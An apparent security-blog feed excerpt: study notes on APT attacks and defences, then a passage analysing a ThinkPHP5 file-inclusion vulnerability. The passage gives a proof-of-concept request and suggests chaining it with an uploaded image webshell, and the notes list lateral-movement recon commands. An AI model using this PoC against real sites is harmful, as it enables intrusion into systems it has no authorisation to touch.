    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="《透视APT》"><a href="#《透视APT》" class="headerlink" title="《透视APT》"></a>《透视APT》</h1><h2 id="网络空间中的对抗"><a href="#网络空间中的对抗" class="headerlink" title="网络空间中的对抗"></a>网络空间中的对抗</h2><h3 id="APT的典型事件之——“震网病毒”"><a href="#APT的典型事件之——“震网病毒”" class="headerlink" title="APT的典型事件之——“震网病毒”"></a>APT的典型事件之——“震网病毒”</h3><ul><li>目标系统：工控系统</li><li>潜伏渗透：感染了伊朗境内60%的PC</li><li>突破物理隔离：U盘(病毒检测到宿主机插上U盘则主动向U盘感染病毒)</li><li>技术水平：同时利用多个0day(微软和西门子工控系统)，体现了APT的高级性</li><li>攻击者：极有可能是敌对关系的政治势力</li><li>攻击持续性：C2服务器2005.11就完成注册,可能长达6~7年</li></ul><h3 id="APT攻击的概念"><a href="#APT攻击的概念" class="headerlink" title="APT攻击的概念"></a>APT攻击的概念</h3><ul><li><p>起源</p><ul><li>由美国一名空军上校2006年提出</li></ul></li><li><p>何时引起关注、高潮</p><ul><li>2010伊朗震网病毒、2013美国”棱镜门”事件</li></ul></li><li><p>定义</p><ul><li><p>知名第三方机构</p><ul><li><p>维基百科、Mandiant、赛门铁克、Damballa、TechTarget</p><ul><li>1.特性：高级、持续、威胁、针对。</li></ul></li></ul></li></ul></li></ul><p>2.目标动机：政治、情报、数据、经济利益<br>3.APT目标：国防、制造业、金融、科研</p><pre><code>- 奇安信威胁情报中心    - 不是一个纯粹的技术概念，泛指有组织，有计划针对特定目标的一系列攻击    - 组织        - 国家或者政府(精神支持和物质基础)        - 情报机构、网络间谍活动的攻击组织        - 经济实体、犯罪组织、恐怖主义组织    - 能力：攻击不计成本(技术成本,比如系统0day)    - 技术特点：针对性、高度隐藏(潜伏渗透周期长)、不以经济利益为直接目的、掌握0day    - 重大安全事件不一定是APT        - 重大损失的，也不一定是APT            - 2016年美国东部互联网瘫痪</code></pre><p>2018年Facebook数据泄露<br>国内酒店大量住户信息泄露</p><pre><code>        - 影响范围大的，也不一定是APT            - 2017年WannaCry勒索病毒        - 针对性强的，也不一定是APT            - 2008年8月俄罗斯对格鲁吉亚的军事行动- APT 与威胁情报    - 威胁情报：安全机构所掌握的、针对特定组织机构的各种网络威胁信息，而该组织机构自身可能并不知道相关威胁的存在或细节        - 威胁情报的主要方面            - 源头、目标、动机、工具、指标、表象、影响、方案</code></pre><h3 id="相关研究"><a href="#相关研究" class="headerlink" title="相关研究"></a>相关研究</h3><ul><li>在全球范围内，APT研究美国和俄罗斯两国属世界一流，中国属全球第二梯队的排头兵</li><li>行业领域：军队与国防、政府、金融、外交、能源、科研、医疗、传媒、电信</li><li>目标地域：全球绝大部分的国家和地区。韩国、中东、美国、俄罗斯、巴基斯坦等国家APT最为活跃</li></ul><h2 id="APT攻击的对象"><a href="#APT攻击的对象" class="headerlink" title="APT攻击的对象"></a>APT攻击的对象</h2><h3 id="工控系统"><a href="#工控系统" class="headerlink" title="工控系统"></a>工控系统</h3><ul><li><p>乌克兰圣诞大停电事件</p><ul><li>核心攻击方式：BlackEnergy 后门程序、攻击者可远程访问并操控电力控制系统</li></ul></li><li><p>沙特阿拉伯大赦之夜攻击事件</p><ul><li><p>核心攻击方式：Shamoon(Disttrack)，能够导致目标网络完全瘫痪(通过当前的权限来访问活动目录、相同域及局域网其他主机进行横向移动)</p><ul><li>投放器(Dropper)</li><li>通信组件(Communications)</li><li>擦除组件(Wiper)</li></ul></li></ul></li><li><p>美国电网承包商攻击事件</p><ul><li>核心攻击方式：渗透网站，向网站上传恶意程序，利用恶意程序跟踪网站访问者，获得相关人员的账号密码，利用该账号发送大量钓鱼邮件</li></ul></li></ul><h3 id="金融系统"><a href="#金融系统" class="headerlink" title="金融系统"></a>金融系统</h3><ul><li><p>多国银行被盗事件</p><ul><li>核心攻击方式：<br>获得银行SWIFT权限，利用SWIFI向其他银行发送转账指令、篡改MT9XX报文清除证据</li></ul></li><li><p>ATM 机盗窃事件</p><ul><li>核心攻击方式：</li></ul></li></ul><p>1.针对性入侵金融机构员工的计算机或银行网络，进行视频监控，查看和记录负责转账系统的银行员工屏幕。获取足够的信息后，模仿银行员工的行为进行恶意操作。<br>2.插入特别制造的芯片(EMV)卡，植入恶意程序，吐钞的同时让计算机断网<br>3.入侵其他资产，通过资产内代理进行授权交易<br>4.入侵内部网络、获得ATM控制权限<br>5.通过光驱、USB接口等直接对ATM机进行操作</p><ul><li><p>黄金眼(国内APT组织)行动事件</p><ul><li>核心攻击方式：以合法软件开发公司伪装，以不当盈利作为目的，长期从事敏感金融交易信息窃取活动。（该组织攻击水平和反侦察能力均达到国际水平)</li></ul></li></ul><h3 id="地缘政治"><a href="#地缘政治" class="headerlink" title="地缘政治"></a>地缘政治</h3><ul><li><p>DNC邮件泄露、美国大选</p><ul><li>希拉里邮件门事件，利用私人电子邮件向家里私人服务器发送大量涉及国家机密的绝密邮件，大约6万封。</li><li>相关细节：希拉里竞选团队主席被钓鱼攻击上钩，泄露邮箱密码，从而获取邮箱中的邮件，同样的攻击方法在团队其他成员中也相继成功。钓鱼邮件使用了(Bitly)短链接技术来进行伪装。</li></ul></li><li><p>法国总统大选</p><ul><li>攻击组织：APT-28<br>文档:Trump’s_Attack_On_Syria_English.docx<br>核心攻击技术：<br>CVE-2017-0262(Word远程代码执行)<br>CVE-2017-0263(Windows本地权限升级)</li></ul></li></ul><h3 id="教育、科研系统"><a href="#教育、科研系统" class="headerlink" title="教育、科研系统"></a>教育、科研系统</h3><ul><li>国内顶尖大学、研究院</li><li>国内海事、电信、能源、国防、军工业</li></ul><h2 id="APT攻击的技术手段"><a href="#APT攻击的技术手段" class="headerlink" title="APT攻击的技术手段"></a>APT攻击的技术手段</h2><h3 id="APT攻击的目标"><a href="#APT攻击的目标" class="headerlink" title="APT攻击的目标"></a>APT攻击的目标</h3><ul><li><p>敏感情报信息</p><ul><li><p>PC敏感文件扩展名</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>移动端敏感文件</p><ul><li>音频、照片、通话录音、录像、通话记录、通讯录、短信、手机基本信息、地理位置信息</li></ul></li><li><p>敏感情报信息窃取方式</p><ul><li>核心思想：选择性窃取（攻击者如果活动太频繁，木马与C&amp;C服务器的通信次数越多越容易暴露）。故APT组织一般只收集特定目录下的文件或者有特殊文件名的文件。</li><li>文件直接回传、Socket通信、 电子邮件</li></ul></li></ul></li><li><p>敏感文件</p></li><li><p>经济利益</p></li><li><p>持续监控</p></li><li><p>破坏</p></li><li><p>攻击目标平台</p><ul><li><p>Windows、Android、MacOS、iOS</p></li><li><p>跨平台的水坑攻击</p><ul><li>带有恶意程序的伪造Flash升级包</li></ul></li></ul></li></ul><h3 id="APT攻击的武器搭载系统"><a href="#APT攻击的武器搭载系统" class="headerlink" title="APT攻击的武器搭载系统"></a>APT攻击的武器搭载系统</h3><ul><li><p>鱼叉攻击(Spear Phishing)</p><ul><li><p>目的：不通过授权访问机密数据</p></li><li><p>手段：最常见的方式是通过电子邮件发送给特定的攻击目标，诱使目标打开附件，这种方式就是鱼叉邮件。</p><ul><li>钓鱼邮件：这个概念和鱼叉邮件类似。不过，钓鱼多是针对普通人的攻击，针对性较弱，精确度较低。</li></ul></li><li><p>实施过程：前期准备-&gt;邮件制作-&gt;邮件投放-&gt;情报回收</p></li><li><p>防护方法：稍微有点安全意识即可，认真查看邮件来源，附件扩展名，病毒扫描，虚拟机，沙箱等。</p></li></ul></li><li><p>水坑攻击(Water Holing)</p><ul><li><p>攻击概述：攻击者通过分析攻击目标的网络活动规律，寻找攻击目标经常访问的网站的弱点，先攻下该站点并植入攻击程序，在攻击目标访问该站点时实施攻击</p></li><li><p>以海莲花APT组织的水坑攻击举例</p><ul><li><p>A方式</p><ul><li>替换目标网站的可信程序(捆绑即时通、证书驱动)</li><li>对目标网站插入恶意JavaScript程序(伪装成Adobe Flash更新程序)</li></ul></li><li><p>B方式</p><ul><li>替换目标网站站点指定链接</li></ul></li></ul></li></ul></li><li><p>PC跳板</p></li><li><p>第三方平台</p><ul><li>APT组织通过社交网络来下发C&amp;C指令，APT组织的专用木马会读取文章中的程序指令来完成指定的攻击操作</li><li>微博、Twitter、Facebook、…</li></ul></li><li><p>恶意硬件中间人劫持</p><ul><li><p>在目标网络环境中部署物理硬件设备，通过中间人方式劫持用户网络流量，替换更新包等软件</p><ul><li>输入法软件、聊天软件、下载软件、影音软件、安全软件、微软系统软件</li></ul></li><li><p>例子：火焰病毒</p></li></ul></li></ul><h3 id="APT攻击的武器装备"><a href="#APT攻击的武器装备" class="headerlink" title="APT攻击的武器装备"></a>APT攻击的武器装备</h3><ul><li><p>专用木马</p><ul><li><p>开机自启动</p><ul><li><p>修改快捷方式</p></li><li><p>DLL(动态链接库)劫持</p></li><li><p>修改注册表、服务、计划任务</p></li><li><p>APT组织为何放弃开机自启动？</p><ul><li><p>特定场景下需要一次性攻击</p><ul><li>火力侦察判断目标是否为真实目标时、目标防护能力很强时（都是为了隐藏自己的攻击</li></ul></li><li><p>依赖原始母体文件运行</p></li><li><p>用其他方法启动木马</p><ul><li>注入到其他进程、或者捆绑到其他软件</li><li>利用漏洞劫持篡改网络流量</li></ul></li></ul></li></ul></li><li><p>加密与自加密</p></li><li><p>木马升级换代</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>出于攻击技术成本考虑、目标系统存在大量已知漏洞但未修复</p></li><li><p>相关例子</p><ul><li><p>CVE-2012-0158</p><ul><li>微软Office漏洞(非常稳定)，远程攻击者诱使目标打开一个经过特殊构造的RTF文件，在符合漏洞条件下，即可在目标机器上执行任意指令。</li></ul></li><li><p>CVE-2015-0097</p><ul><li>微软Office的一个逻辑漏洞，可导致目标通过HTA文件下载恶意程序到本机并执行</li></ul></li><li><p>Android 漏洞</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office 文档漏洞</li><li>Windows 提权漏洞</li><li>Flash 漏洞</li><li>其他0day</li></ul></li><li><p>APT组织武器使用成本原则(0day、或者技术成本较高的攻击手段)</p><ul><li>攻击目标具有足够的攻击价值</li><li>一般的专用木马攻击无效或者无法达到预期目的</li><li>利用1day、nday攻击依然无法达到目的或者无效</li></ul></li><li><p>APT武器研发趋势</p><ul><li><p>特别关注点：RAT(Remote Access Trojan)文件,远程访问木马的文件格式、文件形态、功能形态、恶意程序寄宿位置的变化</p></li><li><p>相关武器研发趋势</p><ul><li><p>从PE到非PE，从有实体到无实体</p></li><li><p>小众编程语言日渐流行(Delphi\GCC\NSIS\AutoIt</p></li><li><p>模块互动，云控技术渐成主流</p></li><li><p>恶意程序寄宿位置越藏越深：从常见的系统目录到难以追踪的MBR, VBR, 磁盘固件, EFI, BIOS, 移动存储设备的隐藏分区</p></li><li><p>独立研发与委托定制成主流</p><ul><li>使用公开的RAT，目的是自我隐藏和嫁祸他人</li><li>绝大部分的APT组织都是在相对独立的环境下完成攻击代码的开发工作</li><li>不排除委托第三方组成协助定制开发的可能性</li></ul></li></ul></li></ul></li></ul><h3 id="APT攻击的-C-amp-C-Command-and-Control"><a href="#APT攻击的-C-amp-C-Command-and-Control" class="headerlink" title="APT攻击的 C&amp;C(Command and Control)"></a>APT攻击的 C&amp;C(Command and Control)</h3><ul><li>主要作用：</li></ul><p>1.向感染了目标机的木马程序发送控制命令，提供下载资源(新木马，木马模块，配置文件等)<br>2.回收木马程序收集到的情报信息，包括文件、邮件等</p><ul><li><p>地域分布</p><ul><li><p>美国最多、其次中国、俄罗斯，西班牙，德国并列第三(2015年)</p><ul><li>一个APT组织可能拥有数十个，或者几个分布于不同地域的C&amp;C服务器</li></ul></li></ul></li><li><p>注册机构</p><ul><li><p>国内外APT组织均使用或部分使用境外服务商动态域名，ChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>动态域名的好处：</li></ul></li></ul></li></ul><p>1.相关注册信息不对外公开(无whois信息)<br>2.需要域名持有者的权限才能查询相关信息</p><ul><li><p>注册偏好</p><ul><li><p>模仿邮箱类</p><ul><li>126mailserver 、mail163等</li></ul></li><li><p>模仿杀毒软件类</p><ul><li>safe360、rising等</li></ul></li><li><p>模仿互联网公司类</p><ul><li>360sc2、sohu、sogou、sina等</li></ul></li></ul></li></ul><h2 id="APT攻击的战术布阵"><a href="#APT攻击的战术布阵" class="headerlink" title="APT攻击的战术布阵"></a>APT攻击的战术布阵</h2><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><ul><li><p>重要性：APT组织发动一次攻击，绝大部分时间都会消耗在情报收集环节上。为了达到攻击目的，攻击者必须尽可能地全面的收集攻击目标相关的情报信息，从认知水平到掌握水平。</p></li><li><p>公开情报收集</p><ul><li>官方网站、行业网站、学术期刊、行业会议、新闻报道等</li></ul></li><li><p>地下情报收集</p><ul><li>地下黑市购买社工库</li><li>入侵第三方网站以获取目标人员、组织的情报信息</li><li>向其他APT组织购买情报信息</li></ul></li></ul><h3 id="火力侦察"><a href="#火力侦察" class="headerlink" title="火力侦察"></a>火力侦察</h3><ul><li>目的：收集攻击目标网络或设备的基本信息、判断攻击目标的真伪(是否为虚拟机)、防御能力、攻击价值。以及方便后期横向移动的准确性。</li><li>主机信息：操作系统信息、主机名称、本地用户名等</li><li>网络信息：主要是IP地址、网关信息</li><li>应用程序信息及相关版本信息，微软Office、微软Internet Explorer</li><li>磁盘信息、当前进程信息等</li></ul><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><ul><li><p>攻击原理</p><ul><li>当攻击目标本身的防御措施特别完善时，或初始攻击无法达到效果，对目标相关的周边企业、人员、供应链进行攻击，有可能取得较好的效果。</li></ul></li><li><p>典型案例</p><ul><li>震网病毒、Havex</li></ul></li></ul><h3 id="假旗行动"><a href="#假旗行动" class="headerlink" title="假旗行动"></a>假旗行动</h3><ul><li><p>概述</p><ul><li><p>也叫伪旗行动，是隐蔽行动的一种。通过使用其他组织的旗帜、制服等手段误导公众、使公众认为该攻击是其他攻击组织执行。</p><ul><li>相关战术术语：拟态、诱饵、混淆、伪装、干扰</li></ul></li></ul></li><li><p>类型</p><ul><li><p>预设陷阱</p><ul><li>样本文件、C&amp;C服务器域名、特殊字符串、上线密码、诱饵文档属性信息等</li></ul></li><li><p>事后掩盖</p><ul><li>攻击成功后，对域名whois、IP地址等信息进行伪装</li></ul></li></ul></li><li><p>冒充对象</p><ul><li>冒充其他APT组织</li><li>冒充普通用户</li></ul></li><li><p>国家级情报机构对该行动的观点</p><ul><li><p>五眼联盟</p><ul><li>与欺骗相关的策略：暗区(DarkSpace)、蜜罐(Honeypot)、蜜令(Honeytoken)、蜜网(Honeynet)、假旗行动(False Flag)、效果(Effects)</li></ul></li><li><p>五眼联盟对假旗行动的观点：1.有意制造攻击目标与被嫁祸国或组织间紧张的敌对气氛，以实现某种政治或经济目的 2.更好地隐藏自己，避免暴露，收获更大利益。</p></li></ul></li></ul><h3 id="周期性袭扰"><a href="#周期性袭扰" class="headerlink" title="周期性袭扰"></a>周期性袭扰</h3><ul><li>周一、二（工作日处理邮件、文件高峰期）</li><li>大型节日（如国庆节、春节等）</li></ul><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ul><li>目的：</li></ul><p>1.进一步在感染的目标机器上获取更多有价值的信息<br>2. 借助受感染的机器，探测周边其他设备的情况或直接向周边设备发动攻击</p><ul><li><p>横向移动攻击步骤</p><ul><li>侦察和识别网络拓扑、获取域计算机信息、当前计算机相关主机信息、网卡信息、路由信息等</li><li>查看远程计算机服务及状态、获取指定IP共享信息、共享目录、扫描内网机器远程端口等</li><li>补充原有木马没有的功能、窃取本机更多信息、向周边其他设备发动攻击</li><li>常用命令：net view、ipconfig /all、netstat -a/n、nbstat -A、systeminfo、tracert -w 1000 8.8.8.8、ping、telnet、利用PowerShell远程加载木马或者上传情报信息到C&amp;C服务器</li></ul></li></ul><h3 id="伪装术"><a href="#伪装术" class="headerlink" title="伪装术"></a>伪装术</h3><ul><li><p>社会工程学伪装</p><ul><li>邮件内容伪装</li><li>邮件身份伪装</li></ul></li><li><p>文件视觉伪装</p><ul><li>文件名</li><li>文件扩展名</li><li>文件图标</li></ul></li><li><p>快捷方式伪装</p><ul><li>将攻击代码文件和一个指向攻击代码的快捷方式文件打包成一个压缩包，同时，快捷方式的命名具有迷惑性</li></ul></li><li><p>捆绑合法程序</p><ul><li><p>AWVS7</p><ul><li>针对网络安全行业</li></ul></li><li><p>办公软件</p><ul><li>政府单位、事业单位</li></ul></li><li><p>即时通、证书驱动</p><ul><li>政府机构</li></ul></li><li><p>微软更新程序</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>压缩包外壳</p><ul><li>将木马程序进行压缩，以压缩包的形式传播</li></ul></li></ul><h3 id="反侦察术"><a href="#反侦察术" class="headerlink" title="反侦察术"></a>反侦察术</h3><ul><li>一些APT组织的攻击木马会判断自身所处的环境、发现杀软时、会选择放弃执行后续的功能代码、或者设法绕过杀软的监测。</li><li>一些APT组织会对安全研究人员进行反向侦察工作，比如海莲花组织向AWVS的破解版中插入了木马。</li></ul><h2 id="APT攻击的监测与防御"><a href="#APT攻击的监测与防御" class="headerlink" title="APT攻击的监测与防御"></a>APT攻击的监测与防御</h2><h3 id="如何发现APT攻击"><a href="#如何发现APT攻击" class="headerlink" title="如何发现APT攻击"></a>如何发现APT攻击</h3><ul><li><p>大数据技术</p><ul><li>数据采集、数据分析、数据呈现</li></ul></li><li><p>威胁情报技术</p><ul><li><p>“标志”(Indicator of Compromise,IOC),也叫入侵指示器：通常包括主机活动中出现的文件、进程、注册表键值、系统服务、网络上的域名、URL、IP等</p></li><li><p>分类</p><ul><li><p>战术情报</p><ul><li>标记攻击者使用工具相关的特纸值及网络基础设施信息、可直接用于设备、实现对攻击活动的监控，IOC即是一个典型</li></ul></li><li><p>作战情报</p><ul><li>描述攻击者的工具、技术和过程，即TTP</li></ul></li><li><p>战略情报</p><ul><li>描述当前对于特定组织的威胁类型和对手现状、指导安全投资的大方向。使用者为CSO(Chief Security Officer), CISO(Chief Information Security Offier)</li></ul></li></ul></li><li><p>威胁情报的利用</p><ul><li><p>~在准备阶段、检测与分析阶段、隔离，清除，与恢复阶段、事后复盘阶段的作用</p></li><li><p>安全运营团队会遇到的问题</p><ul><li>如何高效地发现攻击和入侵活动，评估影响面</li><li>如何获取、处置与已经发现安全事件相关的活动</li><li>如何基于对对手的了解、设置各个环节上的安全控制措施、以阻止相同对手或类似攻击手法的入侵</li><li>理解目前安全威胁的全貌、实现有效的安全投资</li></ul></li></ul></li></ul></li><li><p>流量威胁检测技术</p><ul><li>流量威胁分析</li><li>流量日志存储</li><li>威胁回溯分析</li></ul></li><li><p>网络检测响应技术(Network-based Detection and Response,NDR)</p></li><li><p>终端检测响应技术(Endpoint Detection and Response,EDR)</p><ul><li>基于终端大数据分析的新一代终端安全产品，能对终端行为数据进行全面采集、实时上传、对终端进行持续检测和分析、增强对内部威胁事件的深度可见性，结合相关威胁情报中心推送的情报信息(IP、URL、文件Hash等)能帮助企业快速发现，精确定位高级威胁入侵</li></ul></li></ul><h3 id="如何分析APT攻击"><a href="#如何分析APT攻击" class="headerlink" title="如何分析APT攻击"></a>如何分析APT攻击</h3><ul><li><p>网络杀伤链模型(Cyber Kill Chain)</p><ul><li><p>侦察</p><ul><li>攻击者选择目标、进行研究、搜集目标弱点</li></ul></li><li><p>武器化</p><ul><li>攻击者创建针对一个或多个漏洞定制的远程访问恶意程序武器，比如病毒或蠕虫</li></ul></li><li><p>散布</p><ul><li>将网络武器包向目标投放</li></ul></li><li><p>恶用</p><ul><li>在受害者系统上运行代码</li></ul></li><li><p>设置</p><ul><li>在目标位置安装恶意程序</li></ul></li><li><p>命令和控制</p><ul><li>为攻击者建立可远程控制目标系统的路径</li></ul></li><li><p>目标达成</p><ul><li>攻击者远程完成其预期效果</li></ul></li></ul></li><li><p>钻石模型</p><ul><li><p>攻击者</p><ul><li>分清攻击者有利用了解其目的、归属、适应性和持久性</li></ul></li><li><p>能力</p><ul><li>事件中使用的工具或技术</li></ul></li><li><p>基础设施</p><ul><li>攻击者用来传递能力的物理或逻辑结构，如IP地址、域名、邮件地址、USB设备等</li></ul></li><li><p>受害者</p><ul><li>以社会-政治为支点的安全分析中，受害者作用重大</li></ul></li></ul></li><li><p>自适应安全架构(Adaptive Security Architecture,ASA)</p><ul><li>由美国安全公司Gartner于2014年提出的面向未来的下一代安全架构，从预测、防御、检测、响应四个维度，强度安全防护是一个持续处理、循环的过程，是细粒度、多角度、持续化地对安全威胁进行实时动态分析</li><li>目的：为了解决当前企业的安全防护功能难以应对高级定向攻击的问题</li><li>最终效果：达到网络安全的可管、可控、可视、可调度、可持续</li></ul></li></ul><h3 id="协同联动的纵深防御体系"><a href="#协同联动的纵深防御体系" class="headerlink" title="协同联动的纵深防御体系"></a>协同联动的纵深防御体系</h3><ul><li><p>高级安全威胁的判定</p><ul><li>结合多源头威胁情报应用、沙箱动态行为发现、关联引擎分析</li></ul></li><li><p>安全威胁的处置</p><ul><li>NDR与EDR联动</li></ul></li></ul><h2 id="APT攻击技术-趋势"><a href="#APT攻击技术-趋势" class="headerlink" title="APT攻击技术(趋势)"></a>APT攻击技术(趋势)</h2><h3 id="技术越发高超"><a href="#技术越发高超" class="headerlink" title="技术越发高超"></a>技术越发高超</h3><ul><li><p>非PE文件文件攻击</p><ul><li>文件无需长期驻留磁盘</li><li>核心Payload存放在网络或注册表</li><li>通过系统进程执行Payload</li></ul></li><li><p>开源工具和自动化攻击框架</p><ul><li><p>PowerShell自动化攻击框架</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>“Living off the land”技术</p></li></ul><h3 id="国际冲突地区的APT攻击更加活跃"><a href="#国际冲突地区的APT攻击更加活跃" class="headerlink" title="国际冲突地区的APT攻击更加活跃"></a>国际冲突地区的APT攻击更加活跃</h3><ul><li>能源资源、工业、持有不同政见者</li><li>这类APT组织：黄金鼠、人面狮、APT33、APT34等</li></ul><h3 id="网络空间已成为大国博弈新战场"><a href="#网络空间已成为大国博弈新战场" class="headerlink" title="网络空间已成为大国博弈新战场"></a>网络空间已成为大国博弈新战场</h3><ul><li>影响面：政治、经济、军事谈判等</li></ul><h3 id="针对基础设施的破坏性攻击日益活跃"><a href="#针对基础设施的破坏性攻击日益活跃" class="headerlink" title="针对基础设施的破坏性攻击日益活跃"></a>针对基础设施的破坏性攻击日益活跃</h3><ul><li>“互联网+”、5G、万物互联等新兴技术的兴起</li><li>涉及行业：能源、交通、制造、金融、通信等领域</li><li>现状：很多基础设施和生产系统的网络安全体系建设还基本为零</li></ul><h3 id="针对个人移动终端攻击显著增加"><a href="#针对个人移动终端攻击显著增加" class="headerlink" title="针对个人移动终端攻击显著增加"></a>针对个人移动终端攻击显著增加</h3><ul><li>iOS、Android</li><li>系统漏洞、社会工程学</li><li>典型例子：“三叉戟漏洞”</li></ul><h2 id="典型的APT组织机构"><a href="#典型的APT组织机构" class="headerlink" title="典型的APT组织机构"></a>典型的APT组织机构</h2><h3 id="方程式"><a href="#方程式" class="headerlink" title="方程式"></a>方程式</h3><h3 id="索伦之眼"><a href="#索伦之眼" class="headerlink" title="索伦之眼"></a>索伦之眼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"><a href="#当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。" class="headerlink" title="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"></a>当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;《透视APT》&quot;&gt;&lt;a href=&quot;#《透视APT》&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-文件包含漏洞</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2020-09-16T15:59:09.731Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5文件包含漏洞"><a href="#ThinkPHP5文件包含漏洞" class="headerlink" title="ThinkPHP5文件包含漏洞"></a>ThinkPHP5文件包含漏洞</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>可配合文件上传图片马，GetShell。(PHP 文件包含都讲文件当做php后缀文件进行解析，与实际文件类型无关)</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>漏洞存在于 <strong>ThinkPHP</strong> 模板引擎中，在加载模版解析变量时存在<strong>变量覆盖</strong>问题，而且程序没有对数据进行很好的过滤，最终导致 <strong>文件包含漏洞</strong> 的产生。</p><ul><li>变量覆盖漏洞</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>如果没有指定 flags，则被假定为 EXTR_OVERWRITE。</strong></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)；</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这种情况没有指定 flags，则被假定为 EXTR_OVERWRITE</strong></p><p>假设用户构造以下链接：<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>界面上会打印出private！</p><p>安全的做法是确定register_globals=OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。<br>ps:<br>PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里以<code>ThinkPHP 5.0.18</code>  进行分析。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>在历史<code>Releases</code> 信息中，找到了 <code>5.0.19</code> 中，改进了 模板引擎的一处可能的安全隐患。</p><p><code>/library/think/template/driver/File.php</code> 中的 <code>File</code> 类中的<code>read</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>用户Get提交的数据都会通过<code>input</code> 方法获取数据，然后通过<code>filterValue</code> 方法进行过滤和强制类型转换。</li><li>在修改后的代码下断点，然后看方法调用和参数传递。如下图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>在<code>../application/index/index/controller/index.php</code> 中，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 